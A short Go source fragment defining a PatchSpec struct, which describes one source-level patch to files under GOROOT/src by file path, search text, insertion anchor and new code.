// PatchSpec describes one source-level patch to apply.
type PatchSpec struct {
	File       string // relative path from GOROOT/src
	SearchText string // text to find (exact)
	InsertAfter string // text after which to insert (or "" = append)
	NewCode    string // code to insert
}

